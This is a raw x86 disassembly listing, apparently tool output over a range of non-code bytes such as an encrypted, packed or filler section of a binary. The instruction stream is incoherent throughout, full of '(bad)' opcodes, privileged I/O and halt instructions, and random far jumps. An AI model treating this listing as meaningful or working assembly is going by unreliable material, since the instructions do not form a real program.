  417884:	addr16 into 
  417886:	mov    ecx,0x88db3e00
  41788b:	push   esi
  41788c:	lods   eax,DWORD PTR ds:[esi]
  41788d:	cli    
  41788e:	mov    ah,0x13
  417890:	sub    eax,0x51a83eca
  417895:	test   edx,ecx
  417897:	mov    edx,0x9048f650
  41789c:	bound  esi,QWORD PTR [edi-0x4d]
  41789f:	(bad)  
  4178a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178a2:	mov    cl,0xdf
  4178a4:	inc    esp
  4178a5:	add    BYTE PTR fs:[esi-0x3a61cd5a],ah
  4178ac:	lods   al,BYTE PTR ds:[esi]
  4178ad:	xchg   ebp,eax
  4178ae:	push   0xffffff9e
  4178b0:	call   0x21d2:0x40209ed1
  4178b7:	fst    QWORD PTR [esi-0x504a68f2]
  4178bd:	fild   WORD PTR [edx-0x5f]
  4178c0:	idiv   BYTE PTR [ebx]
  4178c2:	nop
  4178c3:	stc    
  4178c4:	sar    BYTE PTR [esi-0x4a],cl
  4178c7:	xor    edi,esi
  4178c9:	popa   
  4178ca:	dec    edi
  4178cb:	push   ds
  4178cc:	xadd   DWORD PTR [edi+0x5f7b7e2],esp
  4178d3:	in     eax,dx
  4178d4:	sub    esi,DWORD PTR [esi+0x31]
  4178d7:	out    dx,eax
  4178d8:	sti    
  4178d9:	lods   eax,DWORD PTR ds:[esi]
  4178da:	xchg   DWORD PTR [ecx-0x3373ce3f],esi
  4178e0:	int3   
  4178e1:	fld    TBYTE PTR [ebp+0x2c]
  4178e4:	pusha  
  4178e5:	mov    eax,0xb8f15dcb
  4178ea:	ret    0x7abb
  4178ed:	xchg   esi,eax
  4178ee:	sbb    bh,dh
  4178f0:	hlt    
  4178f1:	add    BYTE PTR [esi+0x3b],cl
  4178f4:	lock cmp DWORD PTR [ecx+0x5d749a35],ebx
  4178fb:	push   esi
  4178fc:	push   ebx
  4178fd:	jmp    0x417944
  4178ff:	cmp    DWORD PTR [esi+edx*1+0x75],edi
  417903:	inc    ecx
  417904:	push   ecx
  417905:	fidivr DWORD PTR [esi+0x79f64bb5]
  41790b:	lds    edi,FWORD PTR [edx]
  41790d:	jecxz  0x417982
  41790f:	loop   0x417926
	...
  417971:	add    BYTE PTR [eax],al
  417973:	add    BYTE PTR [eax+0x41],bl
  417976:	pop    ds
  417977:	lods   eax,DWORD PTR ds:[esi]
  417978:	pop    ds
  417979:	(bad)  
  41797a:	cli    
  41797b:	cmc    
  41797c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41797d:	retf   0xe5d4
  417980:	imul   ebx,DWORD PTR [ecx+0x6d],0xf99f1f
  417987:	add    BYTE PTR ds:0xed000001,al
  41798d:	int3   
  41798e:	sbb    eax,0xca1f83ae
  417993:	mov    ds:0xc09f7974,eax
  417998:	add    BYTE PTR ds:[eax+0x20],bl
  41799c:	pop    es
  41799d:	inc    ecx
  41799e:	mov    eax,ds:0x4c9eca92
  4179a3:	sub    al,0x98
  4179a5:	aad    0xd4
  4179a7:	dec    esp
  4179a8:	mov    bh,0xb7
  4179aa:	(bad)  
  4179ab:	shl    esi,0xdc
  4179ae:	push   eax
  4179af:	bnd jbe 0x41797b
  4179b2:	xor    ah,BYTE PTR [edi-0x138e6cef]
  4179b8:	cs jg  0x417a38
  4179bb:	inc    edi
  4179bc:	test   BYTE PTR [edi],dl
  4179be:	das    
  4179bf:	fmul   QWORD PTR [ebx]
  4179c1:	or     eax,0x64656fb2
  4179c6:	out    0x1c,eax
  4179c8:	sti    
  4179c9:	and    dh,BYTE PTR [ebx+0x4c]
  4179cc:	outs   dx,BYTE PTR ds:[esi]
  4179cd:	mov    edx,0x3df84bd8
  4179d2:	daa    
  4179d3:	cli    
  4179d4:	cmp    BYTE PTR [ecx],dh
  4179d6:	outs   dx,DWORD PTR ds:[esi]
  4179d7:	push   esp
  4179d8:	jg     0x41799b
  4179da:	cdq    
  4179db:	call   FWORD PTR [eax]
  4179dd:	scas   eax,DWORD PTR es:[edi]
  4179de:	jb     0x417979
  4179e0:	nop    DWORD PTR gs:[ebx]
  4179e4:	nop
  4179e5:	stc    
  4179e6:	cwde   
  4179e7:	retf   0x2cc
  4179ea:	lahf   
  4179eb:	fsub   QWORD PTR [eax-0x74]
  4179ee:	fdiv   st(2),st
  4179f0:	pop    eax
  4179f1:	push   cs
  4179f2:	adc    BYTE PTR [eax],dl
  4179f4:	dec    edx
  4179f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179f6:	push   0x516afded
  4179fb:	inc    esp
  4179fc:	inc    eax
  4179fd:	cwde   
  4179fe:	cmp    BYTE PTR es:[ebx-0x7fca4a81],ch
  417a05:	push   edi
  417a06:	jns    0x417a60
  417a08:	xor    ch,dh
  417a0a:	mul    DWORD PTR [ecx]
  417a0c:	ds jo  0x4179ad
  417a0f:	jle    0x417a57
  417a11:	sub    al,0xae
  417a13:	cdq    
  417a14:	cmp    esi,DWORD PTR [esi+0x5e]
  417a17:	scas   eax,DWORD PTR es:[edi]
  417a18:	adc    al,0xc5
  417a1a:	(bad)  
  417a1b:	(bad)
  417a1e:	repnz and dl,BYTE PTR [eax+0x1a8cb5b5]
  417a25:	loop   0x417a40
  417a27:	int3   
  417a28:	mov    cs:0x51f93392,al
  417a2e:	jae    0x417a7b
  417a30:	jge    0x417a5f
  417a32:	jl     0x417a9b
  417a34:	xchg   cl,bl
  417a36:	ret    
  417a37:	bnd jae 0x4179bd
  417a3a:	sub    al,0xbe
  417a3c:	lahf   
  417a3d:	cli    
  417a3e:	cmp    BYTE PTR ds:0xc8d114d9,al
  417a44:	cld    
  417a45:	pop    es
  417a46:	pop    esi
  417a47:	dec    ecx
  417a48:	test   DWORD PTR [ebp+ecx*2-0x70e2bd09],ecx
  417a4f:	or     cl,0x52
  417a52:	fild   WORD PTR [edx-0x215476b3]
  417a58:	aam    0xcb
  417a5a:	ficomp WORD PTR [esi]
  417a5c:	jmp    0x28d24d22
  417a61:	and    BYTE PTR [eax+0x7f],dh
  417a64:	push   eax
  417a65:	jne    0x417a16
  417a67:	inc    ebx
  417a68:	dec    ebx
  417a69:	mov    ebx,0x1626cee5
  417a6e:	bound  ecx,QWORD PTR [edi-0xc61d692]
  417a74:	jmp    0xbb87:0xb530c138
  417a7b:	pop    ebp
  417a7c:	pusha  
  417a7d:	hlt    
  417a7e:	mov    al,0xf7
  417a80:	and    eax,0x6b6403b1
  417a85:	cwde   
  417a86:	adc    esp,edi
  417a88:	ins    DWORD PTR es:[edi],dx
  417a89:	cmp    BYTE PTR [esi+edx*4-0x12],bl
  417a8d:	pop    ebx
  417a8e:	in     eax,0x3b
  417a90:	repnz add BYTE PTR [eax],al
	...
  417af3:	add    BYTE PTR [edi],ch
  417af5:	stos   DWORD PTR es:[edi],eax
  417af6:	cdq    
  417af7:	inc    ecx
  417af8:	popf   
  417af9:	jae    0x417afa
  417afb:	out    dx,eax
  417afc:	(bad)  [eax]
  417afe:	xor    ebx,DWORD PTR [ecx-0x102d6d67]
  417b04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b05:	cli    
  417b06:	add    BYTE PTR [eax],al
  417b08:	add    eax,0x45000001
  417b0d:	jbe    0x417ad6
  417b0f:	icebp  
  417b10:	add    eax,0xdd34655a
  417b15:	pop    esi
  417b16:	inc    ecx
  417b17:	shl    eax,0xe5
  417b1a:	pop    es
  417b1b:	sbb    BYTE PTR [ebx+0x6d],dh
  417b1e:	and    eax,0x173a1710
  417b23:	mov    edi,DWORD PTR [edi]
  417b25:	push   edi
  417b26:	jmp    0xe61b:0x362b24
  417b2d:	(bad)  
  417b2e:	push   edx
  417b2f:	add    edx,DWORD PTR [esi]
  417b31:	or     BYTE PTR [esp+esi*2+0x70a366b4],bl
  417b38:	aam    0x8c
  417b3a:	xchg   DWORD PTR [esi],ecx
  417b3c:	and    bh,BYTE PTR [esi+0x37077e9d]
  417b42:	inc    ebp
  417b43:	ret    0x916b
  417b46:	ja     0x417acf
  417b48:	scas   eax,DWORD PTR es:[edi]
  417b49:	dec    ecx
  417b4a:	fucomp st(5)
  417b4c:	stc    
  417b4d:	sub    eax,0xf68eeeb3
  417b52:	imul   edi,DWORD PTR [ecx+0x44],0x8d8fab18
  417b59:	leave  
  417b5a:	hlt    
  417b5b:	iret   
  417b5c:	addr16 cmc 
  417b5e:	dec    esp
  417b5f:	cwde   
  417b60:	or     al,0xce
  417b62:	adc    dl,BYTE PTR [ecx+0x2ba68fc4]
  417b68:	dec    edi
  417b69:	sbb    edx,DWORD PTR [ecx-0x3cf5105]
  417b6f:	and    BYTE PTR [eax],ch
  417b71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b72:	lea    edi,[ecx-0x5]
  417b75:	ficom  WORD PTR [esi+ebx*2-0x41]
  417b79:	mov    DWORD PTR [eax],eax
  417b7b:	gs jns 0x417ba7
  417b7e:	mov    BYTE PTR [eax+0x68],ch
  417b81:	or     DWORD PTR [ecx+eax*1],edx
  417b84:	sub    al,0x2f
  417b86:	lock dec ecx
  417b88:	sub    bl,BYTE PTR [ebx+0x38ba60d2]
  417b8e:	pop    esi
  417b8f:	jbe    0x417b2b
  417b91:	lock ret 0x4b2e
  417b95:	jmp    0xe1fb04d0
  417b9a:	jnp    0x417bb9
  417b9c:	push   ecx
  417b9d:	xchg   eax,esi
  417b9f:	adc    dh,dl
  417ba1:	hlt    
  417ba2:	cmp    ebx,DWORD PTR [ebx+0x6a]
  417ba5:	cld    
  417ba6:	xor    edx,DWORD PTR [ecx-0x26b650ac]
  417bac:	dec    eax
  417bad:	adc    bh,ch
  417baf:	push   esp
  417bb0:	xchg   edi,eax
  417bb1:	lock sbb al,0x10
  417bb4:	call   0xcd63:0xdcaa64ad
  417bbb:	jmp    0x417b4c
  417bbd:	push   ebx
  417bbe:	cld    
  417bbf:	lds    esi,FWORD PTR ds:0x94d13baf
  417bc5:	call   0x9612:0xafc696c7
  417bcc:	sbb    eax,0xc6a62b08
  417bd1:	and    al,0x42
  417bd3:	stc    
  417bd4:	inc    esi
  417bd5:	pop    ss
  417bd6:	xor    BYTE PTR [eax+0x745960bc],cl
  417bdc:	sbb    ah,cl
  417bde:	mov    ebx,0x1af480c1
  417be3:	mov    eax,ds:0xdc2261ea
  417be8:	popa   
  417be9:	add    al,0xef
  417beb:	inc    esi
  417bec:	stos   BYTE PTR es:[edi],al
  417bed:	add    edi,DWORD PTR [ebp+0xdc85bfc]
  417bf3:	mov    ecx,0x217067c5
  417bf8:	xor    BYTE PTR [eax-0x4e],cl
  417bfb:	(bad)  
  417bfd:	cmc    
  417bfe:	daa    
  417bff:	in     al,0xbd
  417c01:	or     al,0x52
  417c03:	jbe    0x417bdc
  417c05:	shld   DWORD PTR [ebp+0xb],ebx,cl
  417c09:	mov    ds:0x2ecb8d03,al
  417c0e:	retf   
  417c0f:	pop    es
  417c10:	jb     0x417c12
	...
  417c72:	add    BYTE PTR [eax],al
  417c74:	mov    eax,eax
  417c76:	nop
  417c77:	test   cl,bl
  417c79:	aam    0x9d
  417c7b:	int    0x75
  417c7d:	aaa    
  417c7e:	das    
  417c7f:	aam    0xf1
  417c81:	aas    
  417c82:	cmp    eax,0xfba96e
  417c87:	add    BYTE PTR ds:0xa3000001,al
  417c8d:	mov    ah,0x2b
  417c8f:	xor    al,0xd4
  417c91:	and    ebp,DWORD PTR [ecx+0x68]
  417c94:	and    al,0x0
  417c97:	stc    
  417c98:	out    0x33,eax
  417c9a:	idiv   DWORD PTR [esi]
  417c9c:	lds    edx,FWORD PTR [ebx+0x5897c0eb]
  417ca2:	je     0x417c2e
  417ca4:	mov    ebx,0xc4807c60
  417ca9:	test   BYTE PTR [ebp+0x619bfb5b],bh
  417caf:	ror    DWORD PTR [eax-0x57124f6d],1
  417cb5:	xchg   DWORD PTR [esi-0x67826faf],edx
  417cbb:	int    0x16
  417cbd:	out    0x74,al
  417cbf:	aad    0x9a
  417cc1:	test   eax,0xf34eded1
  417cc6:	sahf   
  417cc7:	jbe    0x417cc4
  417cc9:	jmp    0x6c97:0xc997f220
  417cd0:	leave  
  417cd1:	fsin   
  417cd3:	push   0xffffffd8
  417cd5:	cmp    edx,ebx
  417cd7:	push   edi
  417cd8:	stos   BYTE PTR es:[edi],al
  417cd9:	push   edx
  417cda:	sbb    al,0x1f
  417cdc:	ret    
  417cdd:	sbb    eax,0xbc000d7d
  417ce2:	cmc    
  417ce3:	lea    ecx,[esi]
  417ce5:	aad    0xad
  417ce7:	xor    eax,0x1e494ee1
  417cec:	sbb    edi,DWORD PTR [edi-0x9254ed8]
  417cf2:	leave  
  417cf3:	xor    esi,edi
  417cf5:	push   ecx
  417cf6:	pop    eax
  417cf7:	push   ds
  417cf8:	and    eax,0x99c7caed
  417cfd:	iret   
  417cfe:	mov    cl,0x67
  417d00:	jbe    0x417cf3
  417d02:	or     al,cl
  417d04:	push   edx
  417d05:	push   cs
  417d06:	dec    esi
  417d07:	cmp    eax,0xb1947f88
  417d0c:	sbb    edx,esi
  417d0e:	call   0x3831b1a5
  417d13:	ds mov ch,0xcf
  417d16:	push   0x396ca4cf
  417d1b:	jmp    0x417d94
  417d1d:	(bad)  
  417d1e:	(bad)  
  417d1f:	mov    ah,0x11
  417d21:	push   ebp
  417d22:	push   ebx
  417d23:	xor    BYTE PTR [edx],0x58
  417d26:	cmp    DWORD PTR [ecx],ecx
  417d28:	jp     0x417d85
  417d2a:	add    BYTE PTR [esi+0x113316e6],cl
  417d30:	or     DWORD PTR [esi-0xe95d57f],edi
  417d36:	mov    ds:0x78d334e,eax
  417d3b:	retf   
  417d3c:	loope  0x417db6
  417d3e:	out    dx,eax
  417d3f:	ins    DWORD PTR es:[edi],dx
  417d40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d41:	fadd   QWORD PTR ds:0x1775286a
  417d47:	sub    eax,0x53a411a4
  417d4c:	inc    edi
  417d4d:	outs   dx,DWORD PTR ds:[esi]
  417d4e:	mov    cl,0xdf
  417d50:	push   edx
  417d51:	inc    edi
  417d52:	jno    0x417dd0
  417d54:	(bad)  
  417d56:	enter  0x29d6,0x8e
  417d5a:	push   ds
  417d5b:	cs mov ch,0xa0
  417d5e:	inc    esp
  417d5f:	dec    ebx
  417d60:	inc    ebx
  417d61:	xor    eax,0x63b5eeda
  417d66:	cmp    BYTE PTR [edx+0x14],cl
  417d69:	xor    esi,DWORD PTR [ecx]
  417d6b:	stc    
  417d6c:	mov    DWORD PTR [edx],eax
  417d6e:	sbb    eax,0x9bafca36
  417d73:	out    0x78,eax
  417d75:	rol    BYTE PTR [eax-0x5e],0x4f
  417d79:	mov    eax,ds:0x685992df
  417d7e:	or     al,0x50
  417d80:	sub    eax,0xacb55f5b
  417d85:	jns    0x417da8
  417d87:	or     ebx,DWORD PTR [ecx-0x1ba6dc80]
  417d8d:	add    esp,ecx
  417d8f:	fcom   QWORD PTR [esi+0x0]
	...
  417df1:	add    BYTE PTR [eax],al
  417df3:	add    BYTE PTR [edi],dl
  417df5:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417dfb:	addr16 dec esi
  417dfd:	sub    BYTE PTR [ecx+0x46],ch
  417e00:	jnp    0x417e1d
  417e02:	push   edi
  417e03:	inc    esp
  417e04:	scas   al,BYTE PTR es:[edi]
  417e05:	cld    
  417e06:	add    BYTE PTR [eax],al
  417e08:	add    eax,0x7e000001
  417e0d:	shl    bh,1
  417e0f:	enter  0xa6db,0xd6
  417e13:	jmp    0x417e03
  417e15:	ins    DWORD PTR es:[edi],dx
  417e16:	cld    
  417e17:	aam    0x41
  417e19:	loopne 0x417e74
  417e1b:	inc    ecx
  417e1c:	repnz pop ecx
  417e1e:	repnz dec ebp
  417e20:	test   al,0x4
  417e22:	inc    eax
  417e23:	and    al,0x92
  417e25:	cmp    ebx,eax
  417e27:	(bad)  
  417e28:	mov    ah,0xab
  417e2a:	dec    edi
  417e2b:	rol    BYTE PTR [ecx+0x7967ee86],0x4e
  417e32:	js     0x417dda
  417e34:	stc    
  417e35:	dec    esp
  417e36:	pusha  
  417e37:	out    dx,al
  417e38:	fidiv  WORD PTR [ebx]
  417e3a:	rcl    BYTE PTR [eax+0x34dc80fe],cl
  417e40:	imul   edi,DWORD PTR [edx-0x7c],0xffffff88
  417e44:	shr    DWORD PTR [ebp+0x4aba1021],1
  417e4a:	fdivr  st(6),st
  417e4c:	jnp    0x417e56
  417e4e:	ficom  DWORD PTR [esp+eax*1-0x19c1487c]
  417e55:	sub    DWORD PTR [ebp-0x8],ebp
  417e58:	fst    st(4)
  417e5a:	xchg   ecx,eax
  417e5b:	xor    DWORD PTR [edi-0x2],edx
  417e5e:	adc    DWORD PTR [edi+0x14],eax
  417e61:	xor    DWORD PTR [edi+ebp*1+0x2a],edi
  417e65:	add    eax,DWORD PTR [esi+0x7b]
  417e68:	cmp    DWORD PTR [eax+ebp*8+0x328d3170],edi
  417e6f:	sub    DWORD PTR [ebp-0x74dee1e2],esi
  417e75:	add    al,0x30
  417e77:	xchg   esp,eax
  417e78:	mov    edi,0x8b9ef8d8
  417e7d:	push   ecx
  417e7e:	jmp    DWORD PTR [ebx]
  417e80:	xchg   esi,eax
  417e81:	jmp    0x9effa048
  417e86:	sbb    ecx,DWORD PTR [edi+0x59]
  417e89:	out    0x56,al
  417e8b:	mov    ds:0xae6d05b1,al
  417e90:	inc    esi
  417e91:	fwait
  417e92:	es xor esi,esi
  417e95:	fistp  WORD PTR [ebp-0x76673cc]
  417e9b:	pop    ecx
  417e9c:	outs   dx,BYTE PTR ds:[esi]
  417e9d:	daa    
  417e9e:	out    dx,eax
  417e9f:	cmp    esi,eax
  417ea1:	adc    BYTE PTR [ecx],0x84
  417ea4:	push   cs
  417ea5:	and    eax,0xbaae037c
  417eaa:	ja     0x417f05
  417eac:	seta   BYTE PTR [edi+0x53]
  417eb0:	push   esi
  417eb1:	push   esi
  417eb2:	in     eax,0x5e
  417eb4:	outs   dx,DWORD PTR ds:[esi]
  417eb5:	push   0x849391e8
  417eba:	aad    0x60
  417ebc:	and    DWORD PTR [eax+0x622ec42b],ecx
  417ec2:	scas   eax,DWORD PTR es:[edi]
  417ec3:	adc    dh,BYTE PTR [ecx-0x2d]
  417ec6:	sbb    DWORD PTR [ebp-0x40],eax
  417ec9:	push   ecx
  417eca:	mov    BYTE PTR [edx+0x3c],dh
  417ecd:	fimul  DWORD PTR [eax]
  417ecf:	cwde   
  417ed0:	das    
  417ed1:	pop    eax
  417ed2:	add    DWORD PTR [edx-0x73],ecx
  417ed5:	aam    0xe2
  417ed7:	iret   
  417ed8:	test   BYTE PTR [esi-0x4d],dh
  417edb:	push   edx
  417edc:	aam    0xea
  417ede:	dec    edx
  417edf:	mov    eax,DWORD PTR [edx+ecx*4+0x73]
  417ee3:	xor    dh,BYTE PTR [eax+0x5d]
  417ee6:	add    eax,DWORD PTR [esp+edi*8-0x78]
  417eea:	dec    edi
  417eeb:	mov    edi,0xe2993946
  417ef0:	(bad)  
  417ef1:	pop    edx
  417ef2:	mov    cl,0x3f
  417ef4:	retf   0x55a2
  417ef7:	jle    0x417f36
  417ef9:	mov    ebx,0x454d0fc2
  417efe:	inc    ecx
  417eff:	fld    DWORD PTR [edx-0x3d]
  417f02:	daa    
  417f03:	ds std 
  417f05:	pop    esp
  417f06:	rol    DWORD PTR [ebx-0x2c2086b0],1
  417f0c:	pop    ebx
  417f0d:	mov    ah,0x27
  417f0f:	ret    
  417f10:	sub    al,BYTE PTR [eax]
	...
  417f72:	add    BYTE PTR [eax],al
  417f74:	(bad)  
  417f75:	out    0xe6,al
  417f77:	cmp    esp,esi
  417f79:	cmp    edi,edi
  417f7b:	push   DWORD PTR [edx]
  417f7d:	xchg   edx,eax
  417f7e:	xor    al,bh
  417f80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f81:	retf   0x14c8
  417f84:	mov    bl,0xfd
  417f86:	add    BYTE PTR [eax],al
  417f88:	add    eax,0x22000001
  417f8d:	jb     0x417f4c
  417f8f:	pop    ds
  417f90:	lods   al,BYTE PTR ds:[esi]
  417f91:	in     eax,0xb9
  417f93:	js     0x417fe0
  417f95:	jp     0x417f4c
  417f97:	jbe    0x417ff5
  417f99:	je     0x417fb7
  417f9b:	push   ebx
  417f9c:	jl     0x417ffe
  417f9e:	or     ebp,DWORD PTR [edx]
  417fa0:	jge    0x418009
  417fa2:	daa    
  417fa3:	clc    
  417fa4:	rcl    BYTE PTR ds:0x502cf5f0,0xdf
  417fab:	xchg   ecx,eax
  417fac:	mov    dl,dl
  417fae:	sbb    ch,dh
  417fb0:	mov    eax,ds:0xc19eec45
  417fb5:	(bad)  
  417fb6:	push   ss
  417fb7:	jne    0x417fce
  417fb9:	(bad)  
  417fbb:	xchg   edx,eax
  417fbc:	pop    eax
  417fbd:	add    bl,dh
  417fbf:	std    
  417fc0:	adc    eax,0xcfbe418
  417fc5:	(bad)  [esi+ecx*4-0x21309a2b]
  417fcc:	sbb    bl,BYTE PTR [edx-0xbdbbf]
  417fd2:	icebp  
  417fd3:	and    eax,0x7bbf60ff
  417fd8:	fcmove st,st(3)
  417fda:	mov    bl,0xeb
  417fdc:	in     eax,0x9e
  417fde:	ret    
  417fdf:	mov    dl,0x39
  417fe1:	out    0x7,eax
  417fe3:	repz jae 0x417fe8
  417fe6:	call   0xfc661ac5
  417feb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417fec:	scas   eax,DWORD PTR es:[edi]
  417fed:	cmp    al,0xd8
  417fef:	in     al,dx
  417ff0:	ror    BYTE PTR [ebx],0x6f
  417ff3:	push   esp
  417ff4:	pop    edi
  417ff5:	clc    
  417ff6:	jno    0x417f7a
  417ff8:	cmp    eax,0xddc8bd9c
  417ffd:	cmp    eax,0x7a987c93
  418002:	mov    al,0xb7
  418004:	icebp  
  418005:	fcom   QWORD PTR ds:[esi+0x2c]
  418009:	aaa    
  41800a:	mov    edx,0xcf2857b7
  41800f:	fwait
  418010:	jle    0x418019
  418012:	loopne 0x418074
  418014:	pop    ebx
  418015:	icebp  
  418016:	adc    ecx,esi
  418018:	dec    eax
  418019:	rol    DWORD PTR [ebx+0x3f],0x49
  41801d:	out    0x39,eax
  41801f:	lahf   
  418020:	jbe    0x418065
  418022:	pop    edi
  418023:	pop    eax
  418024:	push   esi
  418025:	push   ebp
  418026:	sar    DWORD PTR [ecx+0xc],cl
  418029:	cmp    bl,BYTE PTR [edi-0x2e2c300]
  41802f:	sub    DWORD PTR [esi+0x396c895c],ecx
  418035:	jecxz  0x41804a
  418037:	mov    eax,ds:0xc0c63508
  41803c:	mov    ebx,0x8b7bd575
  418041:	xor    edx,esi
  418043:	ins    DWORD PTR es:[edi],dx
  418044:	inc    esi
  418045:	push   DWORD PTR [edx]
  418047:	(bad)  
  418048:	cdq    
  418049:	add    BYTE PTR [edx],0x22
  41804c:	jge    0x41802f
  41804e:	pusha  
  41804f:	(bad)  
  418050:	enter  0xea70,0x9
  418054:	rcr    dl,cl
  418056:	pop    ds
  418057:	loop   0x4180b2
  418059:	pop    eax
  41805a:	popf   
  41805b:	mov    ecx,0xb50d6351
  418060:	les    edx,FWORD PTR [edx]
  418062:	call   0x38e7bc87
  418067:	out    0xa6,al
  418069:	sti    
  41806a:	clc    
  41806b:	ins    BYTE PTR es:[edi],dx
  41806c:	into   
  41806d:	call   0xb8984445
  418072:	pop    ss
  418073:	and    al,0xd9
  418075:	test   BYTE PTR [ebp-0x1daaeba],bl
  41807b:	dec    ebx
  41807c:	lea    eax,[ebx+ebp*4-0x28]
  418080:	mov    BYTE PTR [ebx],cl
  418082:	or     DWORD PTR [edx+0x742e9dca],edi
  418088:	mov    BYTE PTR [edi+0x11e03191],dl
  41808e:	dec    edx
  41808f:	rol    DWORD PTR [eax+eax*1+0x0],1
	...
  4180f2:	add    BYTE PTR [eax],al
  4180f4:	test   eax,0xff456b7e
  4180f9:	push   ebp
  4180fa:	scas   eax,DWORD PTR es:[edi]
  4180fb:	(bad)  
  4180fc:	mov    ds:0x372fdebc,eax
  418101:	xor    al,0x7f
  418103:	mov    ds:0xfeb8,al
  418108:	add    eax,0x6d000001
  41810d:	adc    esi,0x90fd02ef
  418113:	cmc    
  418114:	mov    ebx,fs
  418116:	pop    edx
  418117:	pop    esi
  418118:	mov    cl,0x27
  41811a:	push   ss
  41811b:	and    ch,BYTE PTR [edx]
  41811d:	das    
  41811e:	hlt    
  41811f:	sbb    DWORD PTR [esi+ebp*4-0x45],ebp
  418123:	cmp    BYTE PTR [ebx+0x74bb4024],0xb
  41812a:	in     al,0x3c
  41812c:	(bad)  
  41812e:	stos   DWORD PTR es:[edi],eax
  41812f:	jnp    0x4181ac
  418131:	sar    DWORD PTR [edi+0x47],cl
  418134:	jg     0x4180fd
  418136:	add    al,0x2b
  418138:	loop   0x41812b
  41813a:	addr16 mov ds:0xaecf,al
  41813e:	sub    eax,0x637d7e60
  418143:	nop
  418144:	test   eax,ecx
  418146:	stc    
  418147:	jl     0x4180f3
  418149:	sub    ebx,DWORD PTR [ebx+0x67]
  41814c:	adc    ebx,DWORD PTR [edx-0x38]
  41814f:	adc    ebp,DWORD PTR ds:0x9b149d66
  418155:	aad    0x2f
  418157:	pusha  
  418158:	and    bh,bl
  41815a:	xchg   ecx,eax
  41815b:	adc    edi,DWORD PTR [eax+0x1a2b41a9]
  418161:	jl     0x4180f7
  418163:	fidiv  WORD PTR [edi]
  418165:	add    al,0x7f
  418167:	out    0xff,eax
  418169:	pop    es
  41816a:	stos   DWORD PTR es:[edi],eax
  41816b:	scas   al,BYTE PTR es:[edi]
  41816c:	adc    al,0xfc
  41816e:	sahf   
  41816f:	pop    ss
  418170:	cdq    
  418171:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418172:	out    0xab,al
  418174:	and    BYTE PTR [ebx],al
  418176:	mov    ecx,0x851ed140
  41817b:	scas   al,BYTE PTR es:[edi]
  41817c:	or     eax,0xc7dbfe3e
  418181:	(bad)  
  418182:	sti    
  418183:	mov    eax,ds:0xaa4b64c3
  418188:	mov    edx,0x9341dabd
  41818d:	pop    es
  41818e:	push   ebx
  41818f:	shl    DWORD PTR [esi],cl
  418191:	cmc    
  418192:	sti    
  418193:	stc    
  418194:	pop    ss
  418195:	mov    ebx,DWORD PTR [ebp-0x5180d210]
  41819b:	xchg   edi,eax
  41819c:	out    0x8a,eax
  41819e:	xchg   esi,eax
  41819f:	mov    eax,0xecb924be
  4181a4:	xchg   edi,eax
  4181a5:	data16 cld 
  4181a7:	fstp   DWORD PTR [bp+di]
  4181aa:	repnz aaa 
  4181ac:	pop    ebx
  4181ad:	dec    esp
  4181ae:	mov    ds:0xe9ad1929,al
  4181b3:	pushf  
  4181b4:	test   esi,esi
  4181b6:	cmp    DWORD PTR [ebp-0x678e83cc],esp
  4181bc:	cli    
  4181bd:	push   cs
  4181be:	and    ecx,esi
  4181c0:	sub    BYTE PTR [edx-0x61a019e5],0x51
  4181c7:	jnp    0x4181ed
  4181c9:	xchg   BYTE PTR [edx+0x69],dl
  4181cc:	xor    esp,DWORD PTR [edx]
  4181ce:	or     dh,al
  4181d0:	shr    DWORD PTR [ecx-0x6c36e7aa],1
  4181d6:	pop    esi
  4181d7:	sbb    BYTE PTR [ebp-0x3a],ch
  4181da:	add    dl,bl
  4181dc:	ror    DWORD PTR [eax+0x5f0152e9],1
  4181e2:	sbb    esp,edx
  4181e4:	mov    WORD PTR [edx+0x7fa7d097],ss
  4181ea:	or     eax,0x3b433b53
  4181ef:	(bad)  
  4181f0:	pop    ss
  4181f1:	std    
  4181f2:	data16 jge 0x4181dc
  4181f5:	push   es
  4181f6:	sub    al,0xc9
  4181f8:	das    
  4181f9:	xor    DWORD PTR [eax-0x5506758b],esp
  4181ff:	jl     0x4181c6
  418201:	fld    TBYTE PTR ds:0xe1f5eec2
  418207:	leave  
  418208:	pop    eax
  418209:	fistp  QWORD PTR [ecx+0x5b]
  41820c:	xor    ah,BYTE PTR fs:[ecx+0x7b]
  418210:	add    eax,DWORD PTR [eax]
	...
  418272:	add    BYTE PTR [eax],al
  418274:	aaa    
  418275:	xchg   edx,eax
  418276:	and    al,0x83
  418278:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418279:	mov    bh,0xb7
  41827b:	mov    dh,0x40
  41827d:	mov    ebx,0x92a1b8d6
  418282:	rol    BYTE PTR [edi-0x43],1
  418285:	inc    DWORD PTR [eax]
  418287:	add    BYTE PTR ds:0x3a000001,al
  41828d:	jl     0x4182a4
  41828f:	test   eax,0x36601bcb
  418294:	fcomp  QWORD PTR [edi-0x5c]
  418297:	mov    eax,0xa4f2fd63
  41829c:	push   eax
  41829d:	and    dl,BYTE PTR [ebx]
  41829f:	cmp    DWORD PTR [edi+0x1e64e38b],esp
  4182a5:	addr16 pusha 
  4182a7:	rcr    BYTE PTR [esp+edx*2],cl
  4182aa:	cmp    BYTE PTR [eax+eiz*1+0x30317bca],al
  4182b1:	jge    0x418301
  4182b3:	and    BYTE PTR [ebx],ah
  4182b5:	js     0x4182bf
  4182b7:	daa    
  4182b8:	dec    edi
  4182b9:	mov    esp,0x62bb3d2c
  4182be:	mov    ah,0xd6
  4182c0:	push   0xffffffbc
  4182c2:	dec    DWORD PTR [edi+0x3c]
  4182c5:	test   BYTE PTR [ebx+esi*2+0x5a76a5b],ch
  4182cc:	jo     0x41834d
  4182ce:	(bad)  
  4182cf:	arpl   WORD PTR [eax],si
  4182d1:	inc    DWORD PTR [ebx-0x14f45e04]
  4182d7:	mov    edi,0xe1215b7d
  4182dc:	fld    QWORD PTR [ecx]
